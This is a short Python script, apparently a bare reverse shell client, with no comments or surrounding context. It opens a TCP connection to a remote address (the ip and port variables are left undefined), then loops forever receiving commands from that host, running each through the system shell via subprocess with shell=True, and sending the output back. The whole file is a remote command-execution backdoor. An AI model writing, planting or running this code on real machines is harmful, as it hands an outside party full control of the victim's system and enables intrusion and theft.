from socket import *
import subprocess

def ComProcess(command):
    return subprocess.check_output(command, shell=True)

socket = socket(AF_INET, SOCK_STREAM)

socket.connect((ip, port))

while True:
    command = socket.recv(1024).decode("utf-8")
    data = ComProcess(command)
    socket.send(data)

socket.close()